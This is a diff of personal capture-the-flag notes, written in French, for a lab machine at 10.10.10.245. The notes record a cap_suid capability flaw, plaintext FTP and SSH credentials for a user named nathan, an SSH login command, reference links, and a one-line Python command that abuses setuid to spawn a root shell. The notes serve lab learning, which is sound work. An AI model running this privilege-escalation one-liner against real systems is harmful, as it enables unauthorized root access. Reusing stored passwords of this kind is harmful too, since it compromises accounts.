@@ -1,5 +1,7 @@
 #ip 10.10.10.245
 
+faille cap_suid
+
 #connection vpn avant chaque box :
 -openvpn souley175.ovpn
 
@@ -33,3 +35,21 @@ liste port ouvet :
 
 lien root :
 https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+
+pass ftp : Buck3tH4TF0RM3!
+
+connexion ssh :
+
+ssh nathan@10.10.10.245 
+
+pass ssh : Buck3tH4TF0RM3!
+
+# problèmes de permissions avec gunicorn et les threads. solution de fortune pour le moment.
+#os.setuid(0)
+#command = f "timeout 5 tcpdump -w {path} -i any host {ip}"
+
+cap ctf lien :
+https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities
+
+shell root :
+/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
